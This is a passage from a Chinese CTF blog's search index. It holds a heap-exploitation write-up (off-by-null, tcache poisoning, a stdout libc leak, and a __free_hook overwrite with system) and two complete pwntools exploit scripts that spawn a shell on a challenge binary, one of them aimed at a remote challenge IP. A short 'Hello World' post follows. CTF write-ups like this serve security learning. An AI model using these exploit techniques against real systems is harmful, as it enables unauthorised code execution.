class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, p16(<span class="hljs-number">0xc6a0</span>))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/SU7RO9smPb4J5AM.png"></p><p>接下来把_IO_2_1_stdout_申请下来并修改成<code>p64(0xfbad3887)+p64(0)*3 + p8(0)</code>，就可以泄露libc了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#7</span><br>edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>同样的，把free_hook链到tcache bin上，这次我用到了第一次泄露堆地址申请的小堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">6</span>, p64(free_hook))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/Bb7c1CJalHUqtfQ.png"></p><p>再把free_hook申请下来，改成system的地址，接着free一块写着”/bin/sh\x00”字符串的堆块就能拿到shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, p64(system))<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p><strong>本地调试版</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>    p = process(binary)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;123.60.63.28&#x27;</span>, <span class="hljs-number">49156</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;length\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Name:\n&#x27;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>add(<span class="hljs-number">0x18</span>)<br><br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x4f0</span>)  <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br><br>edit(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x100</span>+<span class="hljs-number">0x81</span>)+p64(heap_base+<span class="hljs-number">0x2e0</span>)*<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;\x01&#x27;</span>*<span class="hljs-number">0x78</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0x180</span>))<br>free(<span class="hljs-number">4</span>)     <span class="hljs-comment"># offbynul</span><br><br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0xf0</span>)   <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, p16(<span class="hljs-number">0xc6a0</span>))<br><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#7</span><br>edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1eb980</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">6</span>, p64(free_hook))<br><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, p64(system))<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>常规爆破版</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(binary)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;length\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    add(<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">0x10</span>)<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">0x10</span>)<br>    show(<span class="hljs-number">0</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Name:\n&#x27;</span>)<br>    heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span><br>    success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>    add(<span class="hljs-number">0x18</span>)<br><br>    add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x4f0</span>)  <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br><br>    edit(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x100</span>+<span class="hljs-number">0x81</span>)+p64(heap_base+<span class="hljs-number">0x2e0</span>)*<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;\x01&#x27;</span>*<span class="hljs-number">0x78</span>)<br>    edit(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0x180</span>))<br>    free(<span class="hljs-number">4</span>)     <span class="hljs-comment"># offbynul</span><br><br>    free(<span class="hljs-number">6</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">0xf0</span>)   <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>    edit(<span class="hljs-number">4</span>, p16(<span class="hljs-number">0xc6a0</span>))<br><br>    add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br>    add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#7</span><br>    edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br>    libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1eb980</span><br>    <span class="hljs-keyword">if</span> libc_base &lt; <span class="hljs-number">0x7f0000000000</span>:<br>        <span class="hljs-keyword">raise</span> <span class="hljs-string">&quot;once again&quot;</span><br>    success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">4</span>)<br>    edit(<span class="hljs-number">6</span>, p64(free_hook))<br><br>    add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>    edit(<span class="hljs-number">4</span>, p64(system))<br>    edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>    free(<span class="hljs-number">1</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            local = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> local:<br>                p = process(binary)<br>                libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                p = remote(<span class="hljs-string">&#x27;123.60.63.28&#x27;</span>, <span class="hljs-number">49156</span>)<br>                libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>            exp()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br></code></pre></td></tr></table></figure><h2 id="BabyPwn"><a href="#BabyPwn" class="headerlink" title="BabyPwn"></a>BabyPwn</h2><p>Bios，摸了，根本没看。队友搞了一天，最后还是卡住了，等wp出了再来复现</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>off by null</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/10/10/hello-world/"/>
    <url>/2021/10/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>时隔一年多又把博客整起来了，算是新的开始吧，希望能养成写博客记录的习惯，给自己加个油！</p><p>博客主要记录CTF-Pwn的一些题解和二进制安全的学习点滴</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
